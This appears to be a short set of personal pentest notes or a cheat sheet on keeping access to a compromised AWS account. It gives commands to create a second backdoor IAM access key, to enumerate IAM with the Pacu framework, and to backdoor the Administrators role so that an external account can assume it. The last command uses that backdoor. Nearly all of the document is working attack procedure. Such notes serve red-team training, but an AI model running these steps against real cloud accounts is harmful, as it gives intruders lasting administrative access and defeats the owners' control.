# Persistence
## Backdoor account with second set of access keys
- Each account can have two access keys
```
aws iam create-access-key --user-name <username>
```

## Trust relationships
- Can create a trust relationship with an entity OUTSIDE of an AWS account. (cross account persistence)

#### Run pacu
```
sudo python3 cli.py
import_keys <AWS PROFILE NAME>
```

#### Run the enumeration modules
```
run iam__enum_users_roles_policies_groups
run iam__enum_permissions
whoami
```

#### Find ARN of external AWS account
```
sudo aws sts get-caller-identity
```

#### Backdoor the role
-  Pacu has a module that backdoors IAM roles called iam__backdoor_assume_role
```
run iam__backdoor_assume_role
run iam__backdoor_assume_role --role-names Administrators --user-arns <full ARN of your external account>
```

#### Use the external AWS account backdoor
- Not sure how to get ARN of the policy
```
sudo aws sts assume-role --role-arn <Full ARN of Backdoored Role> --role-session-name persist --profile <personal AWS account profile>
```